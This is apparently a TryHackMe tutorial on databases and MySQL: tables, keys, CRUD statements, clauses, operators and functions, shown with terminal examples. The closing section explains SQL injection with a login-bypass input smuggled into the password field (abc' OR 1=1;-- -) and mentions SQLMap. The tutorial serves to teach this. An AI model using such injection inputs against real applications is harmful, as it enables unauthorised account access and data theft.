# Databases 101
Introducing Databases
Okay, so you’ve been told just how important they are. Now, it's time to understand what they are in the first place. As mentioned in the introduction, databases are so ubiquitous that you very likely interact with systems that are using them. Databases are an organised collection of structured information or data that is easily accessible and can be manipulated or analysed. That data can take many forms, such as user authentication data (such as usernames and passwords), which are stored and checked against when authenticating into an application or site (like TryHackMe, for example), user-generated data on social media (Like Instagram and Facebook) where data such as user posts, comments, likes etc are collected and stored, as well as information such as watch history which is stored by streaming services such as Netflix and used to generate recommendations. 

I’m sure you get the point: databases are used extensively and can contain many different things. It’s not just massive-scale businesses that use databases. Smaller-scale businesses, when setting up, will almost certainly have to configure a database to store their data. Speaking of kinds of databases, let’s take a look now at what those are.


Different Types of Databases
Now it makes sense that something is used by so many and for (relatively) so long that there would be multiple types of implementations. 
There are quite a few different types of databases that can be built, but for this introductory room, we are going to focus on the two primary types: relational databases (aka SQL) vs non-relational databases (aka NoSQL). 

An illustration comparing relational and non-relational databases. On the left, a relational database is shown with structured tables, rows, and columns, connected by relationships between tables. 
On the right, a non-relational database is depicted with flexible, unstructured data stored in formats like key-value pairs, documents, or collections, with no defined relationships between data points. 
The relational database emphasizes structured organization and data relationships, while the non-relational database highlights flexibility and scalability for diverse data types.

Relational databases: Store structured data, meaning the data inserted into this database follows a structure. 
For example, the data collected on a user consists of first_name, last_name, email_address, username and password. When a new user joins, an entry is made in the database following this structure. This structured data is stored in rows and columns in a table (all of which will be covered shortly); relationships can then be made between two or more tables (for example, user and order_history), hence the term relational databases.

Non-relational databases: Instead of storing data the above way, store data in a non-tabular format. 
For example, if documents are being scanned, which can contain varying types and quantities of data, and are stored in a database that calls for a non-tabular format. Here is an example of what that might look like: 

 {
    _id: ObjectId("4556712cd2b2397ce1b47661"),
    name: { first: "Thomas", last: "Anderson" },
    date_of_birth: new Date('Sep 2, 1964'),
    occupation: [ "The One"],
    steps_taken : NumberLong(4738947387743977493)
}

In terms of what database should be chosen, it always comes down to the context in which the database is going to be used. 
Relational databases are often used when the data being stored is reliably going to be received in a consistent format, where accuracy is important, such as when processing e-commerce transactions. 
Non-relational databases, on the other hand, are better used when the data being received can vary greatly in its format but need to be collected and organised in the same place, such as social media platforms collecting user-generated content.

Tables, Rows and Columns
Now that we’ve defined the two primary types of databases, we’ll focus on relational databases. 
We’ll start by explaining tables, rows, and columns. All data stored in a relational database will be stored in a table; for example, a collection of books in stock at a bookstore might be stored in a table named “Books”. 

An illustration of a database table with rows and columns. The table has labeled columns at the top representing different data fields, such as 'ID', 'Name', and 'Published Date'. 
Each row below the headers contains data entries corresponding to these columns, forming individual records. The structure emphasizes how data is organized in a grid-like format, with each row representing a record and each column representing a specific attribute of the data.

When creating this table, you would need to define what pieces of information are needed to define a book record, for example, “id”, “Name”, and “Published_date”. 
These would then be your columns; when these columns are being defined, you would also define what data type this column should contain; if an attempt is made to insert a record into a database where the data type does not match, it is rejected. 
The data types that can be defined can vary depending on what database you are using, but the core data types used by all include Strings (a collection of words and characters), Integers (numbers), floats/decimals (numbers with a decimal point) and Times/Dates. 

Once a table has been created with the columns defined, the first record would be inserted into the database, for example, a book named “Android Security Internals” with an id of “1” and a publication date of “2014-10-14”. Once inserted, this record would be represented as a row.

Primary and Foreign Keys
Once a table has been defined and populated, more data may need to be stored. For instance, we want to create a table named “Authors” that stores the authors of the books sold in the store. 
Here is a very clear example of a relationship. A book (stored in the Books table) is written by an author (stored in the Authors table). 
If we wanted to query for a book in our story but also have the author of that book returned, our data would need to be related somehow; we do this with keys. There are two types of keys:

An illustration comparing a Primary Key and a Foreign Key in database tables. On the left, a table is shown with a highlighted column labeled 'Primary Key,' which uniquely identifies each record in that table. 
On the right, another table is displayed with a highlighted column labeled 'Foreign Key,' which references the Primary Key from the first table. Arrows connect the Foreign Key to the Primary Key, emphasizing the relationship between the two tables, where the Foreign Key enforces referential integrity by linking related data across tables.

Primary Keys: A primary key is used to ensure that the data collected in a certain column is unique. 
That is, there needs to be a way to identify each record stored in a table, a value unique to that record and is not repeated by any other record in that table. 
Think about matriculation numbers in a university; these are numbers assigned to a student so they can be uniquely identified in records (as sometimes students can have the same name). 
A column has to be chosen in each table as a primary key; in our example, “id” would make the most sense as an id has been uniquely created for each book where, as books can have the same publication date or (in rarer cases) book title. Note that there can only be one primary key column in a table.

Foreign Keys: A foreign key is a column (or columns) in a table that also exists in another table within the database, and therefore provides a link between the two tables. 
In our example, think about adding an “author_id” field to our “Books” table; this would then act as a foreign key because the author_id in our Books table corresponds to the “id” column in the author table. 
Foreign keys are what allow the relationships between different tables in relational databases. Note that there can be more than one foreign key column in a table.

What is SQL?
Now, all of this theoretically sounds great, but in practice, how do databases work? How would you go and make your first table and populate it with data?
What would you use? Databases are usually controlled using a Database Management System (DBMS). Serving as an interface between the end user and the database, a DBMS is a software program that allows users to retrieve, update and manage the data being stored. Some examples of DBMSs include MySQL, MongoDB, Oracle Database and Maria DB. 

An illustration introducing SQL with databases. The image shows a central database icon connected to multiple tables, each with rows and columns representing data.

The interaction between the end user and the database can be done using SQL (Structured Query Language). SQL is a programming language that can be used to query, define and manipulate the data stored in a relational database. 

The Benefits of SQL and Relational Databases
SQL is almost as ubiquitous as databases themselves, and for good reason. Here are some of the benefits that come with learning and using to use SQL:

It's fast: Relational databases (aka those that SQL is used for) can return massive batches of data almost instantaneously due to how little storage space is used and high processing speeds. 

Easy to Learn: Unlike many programming languages, SQL is written in plain English, making it much easier to pick up. 
The highly readable nature of the language means users can concentrate on learning the functions and syntax.

Reliable: As mentioned before, relational databases can guarantee a level of accuracy when it comes to data by defining a strict structure into which data sets must fall in order to be inserted.

Flexible: SQL provides all kinds of capabilities when it comes to querying a database; this allows users to perform vast data analysis tasks very efficiently.
Getting Hands ON

An illustration of a laptop displaying a terminal window used to access and interact with an SQL database.

Now that we’ve covered what SQL is, it’s time to get hands-on and start using it yourself! Click the green "Start Machine" button. The machine will start in Split-Screen view. 
In case the VM is not visible, use the blue Show Split View button at the top of the page. Once the machine has finished booting up, open the terminal and run the following command:

Start Machine
Setting up MySQL
user@tryhackme$ mysql -u root -p
Once prompted for the password, enter:

Setting up MySQL
user@tryhackme$ tryhackme
The output should look as follows:

Setting up MySQL
user@tryhackme$ mysql -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 8.0.39-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2024, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
With that covered, you are ready to start using (and learning) SQL!

CRUD
CRUD stands for Create, Read, Update, and Delete, which are considered the basic operations in any system that manages data.

Let's explore all these different operations when working with MySQL. In the next two tasks, we will be using the books table that is part of the database thm_books. We can access it with the statement use thm_books;.

Create Operation (INSERT)
The Create operation will create new records in a table. In MySQL, this can be achieved by using the statement INSERT INTO, as shown below.

Terminal
mysql> INSERT INTO books (id, name, published_date, description)
    VALUES (1, "Android Security Internals", "2014-10-14", "An In-Depth Guide to Android's Security Architecture");

Query OK, 1 row affected (0.01 sec)

As we can observe, the INSERT INTO statement specifies a table, in this case, books, where you can add a new record; the columns id, name, published_date, and description are the records in the table. 
In this example, a new record with an id of  1, a name of "Android Security Internals", a published_date of "2014-10-14", and a description stating "Android Security Internals provides a complete understanding of the security internals of Android devices" was added.

Note: This operation already exists in the database so there is no need to run the query.

Read Operation (SELECT)
The Read operation, as the name suggests, is used to read or retrieve information from a table. We can fetch a column or all columns from a table with the SELECT statement, as shown in the next example.

Terminal
mysql> SELECT * FROM books;
+----+----------------------------+----------------+------------------------------------------------------+
| id | name                       | published_date | description                                          |
+----+----------------------------+----------------+------------------------------------------------------+
|  1 | Android Security Internals | 2014-10-14     | An In-Depth Guide to Android's Security Architecture |
+----+----------------------------+----------------+------------------------------------------------------+

1 row in set (0.00 sec)         

The above output SELECT statement is followed by an * symbol indicating that all columns should be retrieved, followed by the FROM clause and the table name, in this case, books.

If we want to select a specific column like the name and description, we should specify them instead of the * symbol, as shown below.

Terminal
mysql> SELECT name, description FROM books;
+----------------------------+------------------------------------------------------+
| name                       | description                                          |
+----------------------------+------------------------------------------------------+
| Android Security Internals | An In-Depth Guide to Android's Security Architecture |
+----------------------------+------------------------------------------------------+

1 row in set (0.00 sec)         

Update Operation (UPDATE)
The Update operation modifies an existing record within a table, and the same statement, UPDATE, can be used for this.

Terminal
mysql> UPDATE books
    SET description = "An In-Depth Guide to Android's Security Architecture."
    WHERE id = 1;

Query OK, 1 row affected (0.00 sec)
Rows matched: 1  Changed: 1  Warnings: 0     

The UPDATE statement specifies the table, in this case, books, and then we can use SET followed by the column name we will update. 
The WHERE clause specifies which row to update when the clause is met, in this case, the one with id 1.

Delete Operation (DELETE)
The delete operation removes records from a table. We can achieve this with the DELETE statement.

Note: There is no need to run the query. Deleting this entry will affect the rest of the examples in the upcoming tasks.

Terminal
mysql> DELETE FROM books WHERE id = 1;

Query OK, 1 row affected (0.00 sec)    

Above, we can observe the DELETE statement followed by the FROM clause, which allows us to specify the table where the record will be removed, in this case, books, followed by the WHERE clause that indicates that it should be the one where the id is 1.

Summary
In summary, CRUD operations results are fundamental for data operations and when interacting with databases. The statements associated with them are listed below.

Create (INSERT statement) - Adds a new record to the table.
Read (SELECT statement) - Retrieves record from the table.
Update (UPDATE statement) - Modifies existing data in the table.
Delete (DELETE statement) - Removes record from the table.
These operations enable us to effectively manage and manipulate data within a database.

Answer the questions below

Clauses
A clause is a part of a statement that specifies the criteria of the data being manipulated, usually by an initial statement. Clauses can help us define the type of data and how it should be retrieved or sorted. 

In previous tasks, we already used some clauses, such as FROM that is used to specify the table we are accessing with our statement and WHERE, which specifies which records should be used.

This task will focus on other clauses: DISTINCT, GROUP BY, ORDER BY, and HAVING.

In this task, we will continue to use the books table that is part of the database thm_books. We can access it with the statement use thm_books;.

DISTINCT Clause
The DISTINCT clause is used to avoid duplicate records when doing a query, returning only unique values.

Let's use a query SELECT * FROM books and observe the results below.

Terminal
mysql> SELECT * FROM books;
+----+----------------------------+----------------+--------------------------------------------------------+
| id | name                       | published_date | description                                            |
+----+----------------------------+----------------+--------------------------------------------------------+
|  1 | Android Security Internals | 2014-10-14     | An In-Depth Guide to Android's Security Architecture   |
|  2 | Bug Bounty Bootcamp        | 2021-11-16     | The Guide to Finding and Reporting Web Vulnerabilities |
|  3 | Car Hacker's Handbook      | 2016-02-25     | A Guide for the Penetration Tester                     |
|  4 | Designing Secure Software  | 2021-12-21     | A Guide for Developers                                 |
|  5 | Ethical Hacking            | 2021-11-02     | A Hands-on Introduction to Breaking In                 |
|  6 | Ethical Hacking            | 2021-11-02     |                                                        |
+----+----------------------------+----------------+--------------------------------------------------------+

6 rows in set (0.00 sec)

The query's output displays all the content of the table books, and the record Ethical Hacking is displayed twice. Let's perform the query again, but this time, using the DISTINCT clause.

Terminal
mysql> SELECT DISTINCT name FROM books;
+----------------------------+
| name                       |
+----------------------------+
| Android Security Internals |
| Bug Bounty Bootcamp        |
| Car Hacker's Handbook      |
| Designing Secure Software  |
| Ethical Hacking            |
+----------------------------+

5 rows in set (0.00 sec)

The output shows that only five rows are returned, and just one instance of the Ethical Hacking record is displayed.

GROUP BY Clause
The GROUP BY clause aggregates data from multiple records and groups the query results in columns. This can be helpful for aggregating functions.

Terminal
mysql> SELECT name, COUNT(*)
    FROM books
    GROUP BY name;
+----------------------------+----------+
| name                       | COUNT(*) |
+----------------------------+----------+
| Android Security Internals |        1 |
| Bug Bounty Bootcamp        |        1 |
| Car Hacker's Handbook      |        1 |
| Designing Secure Software  |        1 |
| Ethical Hacking            |        2 |
+----------------------------+----------+

5 rows in set (0.00 sec)

In the example above, the records on the book table are regrouped by the result of the COUNT function. 
We already know that Ethical hacking is listed twice, so the total count is 2, placed at the end since it is grouped by count.

ORDER BY Clause
The ORDER BY clause can be used to sort the records returned by a query in ascending or descending order.
Using functions like ASC and DESC can help us to accomplish that, as shown below in the next two examples.

ASCENDING ORDER
Terminal
mysql> SELECT *
    FROM books
    ORDER BY published_date ASC;
+----+----------------------------+----------------+--------------------------------------------------------+
| id | name                       | published_date | description                                            |
+----+----------------------------+----------------+--------------------------------------------------------+
|  1 | Android Security Internals | 2014-10-14     | An In-Depth Guide to Android's Security Architecture   |
|  3 | Car Hacker's Handbook      | 2016-02-25     | A Guide for the Penetration Tester                     |
|  5 | Ethical Hacking            | 2021-11-02     | A Hands-on Introduction to Breaking In                 |
|  6 | Ethical Hacking            | 2021-11-02     |                                                        |
|  2 | Bug Bounty Bootcamp        | 2021-11-16     | The Guide to Finding and Reporting Web Vulnerabilities |
|  4 | Designing Secure Software  | 2021-12-21     | A Guide for Developers                                 |
+----+----------------------------+----------------+--------------------------------------------------------+

6 rows in set (0.00 sec)

DESCENDING ORDER
Terminal
mysql> SELECT *
    FROM books
    ORDER BY published_date DESC;
+----+----------------------------+----------------+--------------------------------------------------------+
| id | name                       | published_date | description                                            |
+----+----------------------------+----------------+--------------------------------------------------------+
|  4 | Designing Secure Software  | 2021-12-21     | A Guide for Developers                                 |
|  2 | Bug Bounty Bootcamp        | 2021-11-16     | The Guide to Finding and Reporting Web Vulnerabilities |
|  5 | Ethical Hacking            | 2021-11-02     | A Hands-on Introduction to Breaking In                 |
|  6 | Ethical Hacking            | 2021-11-02     |                                                        |
|  3 | Car Hacker's Handbook      | 2016-02-25     | A Guide for the Penetration Tester                     |
|  1 | Android Security Internals | 2014-10-14     | An In-Depth Guide to Android's Security Architecture   |
+----+----------------------------+----------------+--------------------------------------------------------+

6 rows in set (0.00 sec)

We can observe the difference when sorting by ascending order using ASC and in descending order using DESC, both using the published_date as reference.


HAVING Clause
The HAVING clause is used with other clauses to filter groups or results of records based on a condition. 
In the case of GROUP BY, it evaluates the condition to TRUE or FALSE, unlike the WHERE clause HAVING filters the results after the aggregation is performed.

Terminal
mysql> SELECT name, COUNT(*)
    FROM books
    GROUP BY name
    HAVING name LIKE '%Hack%';
+-----------------------+----------+
| name                  | COUNT(*) |
+-----------------------+----------+
| Car Hacker's Handbook |        1 |
| Ethical Hacking       |        2 |
+-----------------------+----------+

2 rows in set (0.00 sec)

In the example above, we can observe that the query returns the books with the names that contain the word hack and the proper count, as we learned before.

Operators
When working with SQL and dealing with logic and comparisons, operators are our way to filter and manipulate data effectively. Understanding these operators will help us to create more precise and powerful queries.  In the next two tasks, we will be using the books table that is part of the database thm_books2. We can access it with the statement use thm_books2;.

Logical Operators
These operators test the truth of a condition and return a boolean value of TRUE or FALSE. Let's explore some of these operators next.

LIKE Operator
The LIKE operator is commonly used in conjunction with clauses like WHERE in order to filter for specific patterns within a column. Let's continue using our DataBase to query an example of its usage.

Terminal
mysql> SELECT *
    FROM books
    WHERE description LIKE "%guide%";
+----+----------------------------+----------------+--------------------------------------------------------+--------------------+
| id | name                       | published_date | description                                            | category           |
+----+----------------------------+----------------+--------------------------------------------------------+--------------------+
|  1 | Android Security Internals | 2014-10-14     | An In-Depth Guide to Android's Security Architecture   | Defensive Security |
|  2 | Bug Bounty Bootcamp        | 2021-11-16     | The Guide to Finding and Reporting Web Vulnerabilities | Offensive Security |
|  3 | Car Hacker's Handbook      | 2016-02-25     | A Guide for the Penetration Tester                     | Offensive Security |
|  4 | Designing Secure Software  | 2021-12-21     | A Guide for Developers                                 | Defensive Security |
+----+----------------------------+----------------+--------------------------------------------------------+--------------------+

4 rows in set (0.00 sec)  

The query above returns a list of records from the books filtered, but the ones using the WHERE clause that contains the word guide by using the LIKE operator.

AND Operator
The AND operator uses multiple conditions within a query and returns TRUE if all of them are true.

Terminal
mysql> SELECT *
    FROM books
    WHERE category = "Offensive Security" AND name = "Bug Bounty Bootcamp"; 
+----+---------------------+----------------+--------------------------------------------------------+--------------------+
| id | name                | published_date | description                                            | category           |
+----+---------------------+----------------+--------------------------------------------------------+--------------------+
|  2 | Bug Bounty Bootcamp | 2021-11-16     | The Guide to Finding and Reporting Web Vulnerabilities | Offensive Security |
+----+---------------------+----------------+--------------------------------------------------------+--------------------+
    
1 row in set (0.00 sec)  

The query above returns the book with the name Bug Bounty Bootcamp, which is under the category of Offensive Security.

OR Operator
The OR operator combines multiple conditions within queries and returns TRUE if at least one of these conditions is true.

Terminal
mysql> SELECT *
    FROM books
    WHERE name LIKE "%Android%" OR name LIKE "%iOS%"; 
+----+----------------------------+----------------+------------------------------------------------------+--------------------+
| id | name                       | published_date | description                                          | category           |
+----+----------------------------+----------------+------------------------------------------------------+--------------------+
|  1 | Android Security Internals | 2014-10-14     | An In-Depth Guide to Android's Security Architecture | Defensive Security |
+----+----------------------------+----------------+------------------------------------------------------+--------------------+

1 row in set (0.00 sec)

The query above returns books whose names include either Android or IOS.

NOT Operator
The NOT operator reverses the value of a boolean operator, allowing us to exclude a specific condition.

Terminal
mysql> SELECT *
    FROM books
    WHERE NOT description LIKE "%guide%";
+----+-----------------+----------------+----------------------------------------+--------------------+
| id | name            | published_date | description                            | category           |
+----+-----------------+----------------+----------------------------------------+--------------------+
|  5 | Ethical Hacking | 2021-11-02     | A Hands-on Introduction to Breaking In | Offensive Security |
+----+-----------------+----------------+----------------------------------------+--------------------+

1 row in set (0.00 sec)

The query above returns results where the description does not contain the word guide.

BETWEEN Operator
The BETWEEN operator allows us to test if a value exists within a defined range.

Terminal
mysql> SELECT *
    FROM books
    WHERE id BETWEEN 2 AND 4;
+----+---------------------------+----------------+--------------------------------------------------------+--------------------+
| id | name                      | published_date | description                                            | category           |
+----+---------------------------+----------------+--------------------------------------------------------+--------------------+
|  2 | Bug Bounty Bootcamp       | 2021-11-16     | The Guide to Finding and Reporting Web Vulnerabilities | Offensive Security |
|  3 | Car Hacker's Handbook     | 2016-02-25     | A Guide for the Penetration Tester                     | Offensive Security |
|  4 | Designing Secure Software | 2021-12-21     | A Guide for Developers                                 | Defensive Security |
+----+---------------------------+----------------+--------------------------------------------------------+--------------------+

3 rows in set (0.00 sec)

The query above returns books whose id is between 2 and 4.

Comparison Operators
The comparison operators are used to compare values and check if they meet specified criteria.

Equal To Operator
The = (Equal) operator compares two expressions and determines if they are equal, or it can check if a value matches another one in a specific column.

Terminal
mysql> SELECT *
    FROM books
    WHERE name = "Designing Secure Software";
+----+---------------------------+----------------+------------------------+--------------------+
| id | name                      | published_date | description            | category           |
+----+---------------------------+----------------+------------------------+--------------------+
|  4 | Designing Secure Software | 2021-12-21     | A Guide for Developers | Defensive Security |
+----+---------------------------+----------------+------------------------+--------------------+

1 row in set (0.10 sec)

The query above returns the book with the exact name Designing Secure Software.

Not Equal To Operator
The != (not equal) operator compares expressions and tests if they are not equal; it also checks if a value differs from the one within a column.

Terminal
mysql> SELECT *
    FROM books
    WHERE category != "Offensive Security";
+----+----------------------------+----------------+------------------------------------------------------+--------------------+
| id | name                       | published_date | description                                          | category           |
+----+----------------------------+----------------+------------------------------------------------------+--------------------+
|  1 | Android Security Internals | 2014-10-14     | An In-Depth Guide to Android's Security Architecture | Defensive Security |
|  4 | Designing Secure Software  | 2021-12-21     | A Guide for Developers                               | Defensive Security |
+----+----------------------------+----------------+------------------------------------------------------+--------------------+

2 rows in set (0.00 sec)

The query above returns books except those whose category is Offensive Security.

Less Than Operator
Less Than Operator

The < (less than) operator compares if the expression with a given value is lesser than the provided one.

Terminal
mysql> SELECT *
    FROM books
    WHERE published_date < "2020-01-01";
+----+----------------------------+----------------+------------------------------------------------------+--------------------+
| id | name                       | published_date | description                                          | category           |
+----+----------------------------+----------------+------------------------------------------------------+--------------------+
|  1 | Android Security Internals | 2014-10-14     | An In-Depth Guide to Android's Security Architecture | Defensive Security |
|  3 | Car Hacker's Handbook      | 2016-02-25     | A Guide for the Penetration Tester                   | Offensive Security |
+----+----------------------------+----------------+------------------------------------------------------+--------------------+

2 rows in set (0.00 sec)

The query above returns books that were published before January 1, 2020.

Greater Than Operator
The > (greater than) operator compares if the expression with a given value is greater than the provided one.

Terminal
mysql> SELECT *
    FROM books
    WHERE published_date > "2020-01-01";
+----+---------------------------+----------------+--------------------------------------------------------+--------------------+
| id | name                      | published_date | description                                            | category           |
+----+---------------------------+----------------+--------------------------------------------------------+--------------------+
|  2 | Bug Bounty Bootcamp       | 2021-11-16     | The Guide to Finding and Reporting Web Vulnerabilities | Offensive Security |
|  4 | Designing Secure Software | 2021-12-21     | A Guide for Developers                                 | Defensive Security |
|  5 | Ethical Hacking           | 2021-11-02     | A Hands-on Introduction to Breaking In                 | Offensive Security |
+----+---------------------------+----------------+--------------------------------------------------------+--------------------+

3 rows in set (0.00 sec)

The query above returns books published after January 1, 2020.

Less Than or Equal To and Greater  Than or Equal To Operators
The <= (Less than or equal) operator compares if the expression with a given value is less than or equal to the provided one. 
On the other hand, The >= (Greater than or Equal) operator compares if the expression with a given value is greater than or equal to the provided one. Let's observe some examples of both below.

Terminal
mysql> SELECT *
    FROM books
    WHERE published_date <= "2021-11-15";
+----+----------------------------+----------------+------------------------------------------------------+--------------------+
| id | name                       | published_date | description                                          | category           |
+----+----------------------------+----------------+------------------------------------------------------+--------------------+
|  1 | Android Security Internals | 2014-10-14     | An In-Depth Guide to Android's Security Architecture | Defensive Security |
|  3 | Car Hacker's Handbook      | 2016-02-25     | A Guide for the Penetration Tester                   | Offensive Security |
|  5 | Ethical Hacking            | 2021-11-02     | A Hands-on Introduction to Breaking In               | Offensive Security |
+----+----------------------------+----------------+------------------------------------------------------+--------------------+

3 rows in set (0.00 sec)

The query above returns books published on or before November 15, 2021.

Terminal
mysql> SELECT *
    FROM books
    WHERE published_date >= "2021-11-02";
+----+---------------------------+----------------+--------------------------------------------------------+--------------------+
| id | name                      | published_date | description                                            | category           |
+----+---------------------------+----------------+--------------------------------------------------------+--------------------+
|  2 | Bug Bounty Bootcamp       | 2021-11-16     | The Guide to Finding and Reporting Web Vulnerabilities | Offensive Security |
|  4 | Designing Secure Software | 2021-12-21     | A Guide for Developers                                 | Defensive Security |
|  5 | Ethical Hacking           | 2021-11-02     | A Hands-on Introduction to Breaking In                 | Offensive Security |
+----+---------------------------+----------------+--------------------------------------------------------+--------------------+

3 rows in set (0.00 sec)

The query above returns books that were published on or after November 2, 2021.

Functions
When working with Data, functions can help us streamline queries and operations and manipulate data. Let's explore some of these functions next.

String Functions

Strings functions perform operations on a string, returning a value associated with it.

CONCAT() Function

This function is used to add two or more strings together. It is useful to combine text from different columns.

Terminal
mysql> SELECT CONCAT(name, " is a type of ", category, " book.") AS book_info FROM books;
+------------------------------------------------------------------+
| book_info                                                         |
+------------------------------------------------------------------+
| Android Security Internals is a type of Defensive Security book. |
| Bug Bounty Bootcamp is a type of Offensive Security book.        |
| Car Hacker's Handbook is a type of Offensive Security book.      |
| Designing Secure Software is a type of Defensive Security book.  |
| Ethical Hacking is a type of Offensive Security book.            |
+------------------------------------------------------------------+

5 rows in set (0.00 sec)  

This query concatenates the name and category columns from the books table into a single one named book_info.

GROUP_CONCAT() Function

This function can help us to concatenate data from multiple rows into one field. Let's explore an example of its usage.

Terminal
mysql> SELECT category, GROUP_CONCAT(name SEPARATOR ", ") AS books
    FROM books
    GROUP BY category;
+--------------------+-------------------------------------------------------------+
| category           | books                                                       |
+--------------------+-------------------------------------------------------------+
| Defensive Security | Android Security Internals, Designing Secure Software       |
| Offensive Security | Bug Bounty Bootcamp, Car Hacker's Handbook, Ethical Hacking |
+--------------------+-------------------------------------------------------------+

2 rows in set (0.01 sec)

The query above groups the books by category and concatenates the titles of books within each category into a single string.

SUBSTRING() Function

This function will retrieve a substring from a string within a query, starting at a determined position. The length of this substring can also be specified.

Terminal
mysql> SELECT SUBSTRING(published_date, 1, 4) AS published_year FROM books;
+----------------+
| published_year |
+----------------+
| 2014           |
| 2021           |
| 2016           |
| 2021           |
| 2021           |
+----------------+

5 rows in set (0.00 sec)  

In the query above, we can observe how it extracts the first four characters from the published_date column and stores them in the published_year column.

LENGTH() Function

This function returns the number of characters in a string. This includes spaces and punctuation. We can find an example below.

Terminal
mysql> SELECT LENGTH(name) AS name_length FROM books;
+-------------+
| name_length |
+-------------+
|          26 |
|          19 |
|          21 |
|          25 |
|          15 |
+-------------+

5 rows in set (0.00 sec)  

As we can observe above, the query calculates the length of the string within the name column and stores it in a column named name_length.

Aggregate Functions

These functions aggregate the value of multiple rows within one specified criteria in the query; It can combine multiple values into one result.

COUNT() Function

This function returns the number of records within an expression, as the example below shows.

Terminal
mysql> SELECT COUNT(*) AS total_books FROM books;
+-------------+
| total_books |
+-------------+
|           5 |
+-------------+

1 row in set (0.01 sec)

This query above counts the total number of rows in the books table. The result is 5, as there are five books in the books table, and it's stored in the total_books column.

SUM() Function

This function sums all values (not NULL) of a determined column.

Note: There is no need to execute this query. This is just for example purposes.

Terminal
mysql> SELECT SUM(price) AS total_price FROM books;
+-------------+
| total_price |
+-------------+
|      249.95 |
+-------------+

1 row in set (0.00 sec)

The query above calculates the total sum of the price column. The result provides the aggregate price of all books in the column total_price.

MAX() Function

This function calculates the maximum value within a provided column in an expression.

Terminal
mysql> SELECT MAX(published_date) AS latest_book FROM books;
+-------------+
| latest_book |
+-------------+
| 2021-12-21  |
+-------------+

1 row in set (0.00 sec)

The query above retrieves the latest publication (maximum value) date from the books table. The result 2021-12-21 is stored in the column latest_book.

MIN() Function

This function calculates the minimum value within a provided column in an expression.

Terminal
mysql> SELECT MIN(published_date) AS earliest_book FROM books;
+---------------+
| earliest_book |
+---------------+
| 2014-10-14    |
+---------------+

1 row in set (0.00 sec)

The query above retrieves the earliest publication (minimum value) date from the books table. The result 2014-10-14 is stored in the earliest_book column.

TASK 8: Functions
SQL functions are powerful tools for manipulating data, enabling us to streamline queries, transform data, and gain insights. Here’s a guide to some essential SQL functions.

String Functions
CONCAT():

Joins multiple strings into one.
SELECT CONCAT(name, " is a type of ", category, " book.") AS book_info FROM books;
This concatenates book names and categories into a single sentence.
GROUP_CONCAT():

Concatenates values from multiple rows into a single field, useful for grouping.
SELECT category, GROUP_CONCAT(name SEPARATOR ", ") AS books FROM books GROUP BY category;
This groups books by category, listing book titles in a single string for each category.
SUBSTRING():

Extracts a part of a string starting at a specified position.
SELECT SUBSTRING(published_date, 1, 4) AS published_year FROM books;
This extracts the year from the published_date, storing it as published_year.
LENGTH():

Returns the number of characters in a string (including spaces and punctuation).
SELECT LENGTH(name) AS name_length FROM books;
This calculates and displays the length of each book title.
Aggregate Functions
COUNT():

Counts the number of rows that match the criteria.
SELECT COUNT(*) AS total_books FROM books;
This counts the total books in the table, displaying it as total_books.
SUM():

Adds up all values in a column.
SELECT SUM(price) AS total_price FROM books;
This calculates the total price of all books.
MAX():

Finds the maximum value in a column.
SELECT MAX(published_date) AS latest_book FROM books;
This retrieves the latest publication date.
MIN():

Finds the minimum value in a column.
SELECT MIN(published_date) AS earliest_book FROM books;
This retrieves the earliest publication date.
Summary
String Functions (CONCAT, GROUP_CONCAT, SUBSTRING, LENGTH): Manipulate and transform text.
Aggregate Functions (COUNT, SUM, MAX, MIN): Perform calculations across multiple rows, providing insights into data.

In the previous task, we studied how websites and applications interact with databases to store, modify, and retrieve their data in a structured manner. In this task, we will see how the interaction between an application and a database happens through SQL queries and how attackers can leverage these SQL queries to perform SQL injection attacks.

Note: Before we proceed, please ensure that you try the manual or automated SQL injection methods only after the permission of the application owner.


Database with an injection depicting the exploitation of SQL injection vulnerability.

Let’s take an example of a login page that asks you to enter your username and password to log in. Let’s provide it with the following data:

Username: John

Password: Un@detectable444

Once you enter your username and password, the website will receive it, make an SQL query with your credentials, and send it to the database. 

SELECT * FROM users WHERE username = 'John' AND password = 'Un@detectable444';
This query will be executed in the database. As per this query, the database will check for a user named John and the password of Un@detectable444. If it finds such a user, it will return the user’s details to the application. Note that the above query will be successful only if the given user and pass both have a match together in the database as they are separated by the boolean “AND”.

Sometimes, when input is improperly sanitized, meaning that user input is not validated, attackers can manipulate the input and write SQL queries that would get executed in the database and perform the attacker’s desired actions. SQL injection has a very harmful effect in this digital world as all organizations store their data, including their critical information, inside the databases, and a successful SQL injection attack can compromise their critical data.

Let’s assume the website login page we discussed above lacks input validation and sanitization. This means that it is vulnerable to SQL injection. The attacker does not know the password of the user John. They will type the following input in the given fields:

Username: John

Password: abc' OR 1=1;-- -

This time, the attacker typed a random string abc and an injected string ' OR 1=1;-- -. The SQL query that the website would send to the database will now become the following:

SELECT * FROM users WHERE username = 'John' AND password = 'abc' OR 1=1;-- -';
This statement looks similar to the previous SQL query but now adds another condition with the operator OR. This query will see if there is a user, John. Then, it will check if John has the password abc (which he could not have because the attacker entered a random password). Ideally, the query should fail here because it expects both username and password to be correct, as there is an AND operator between them. But, this query has another condition, OR, between the password and a statement 1=1. Any one of them being true will make the whole SQL query successful. The password failed, so the query will check the next condition, which checks if 1=1. As we know, 1=1 is always true, so it will ignore the random password entered before this and consider this statement as true, which will successfully execute this query. The -- - at the end of the query would comment anything after 1=1, which means the query would be successfully executed, and the attacker would get logged in to John’s user account.

One of the important things to note here is the use of a single quote ' after abc. Without this single quote,' the whole string 'abc OR 1=1;-- -' would be considered the password, which is not intended. However, if we add a single quote ' after abc, the password would look like 'abc' OR 1=1;---', which encloses the original string abc in the query and allows us to introduce a logical condition OR 1=1, which is always true.

Carrying out an SQL injection attack involves discovering the SQL injection vulnerability inside the application and manipulating the database. However, manually doing all this can take time and effort.

SQLMap is an automated tool for detecting and exploiting SQL injection vulnerabilities in web applications. It simplifies the process of identifying these vulnerabilities. This tool is built into some Linux distributions, but you can easily install it if it's not.

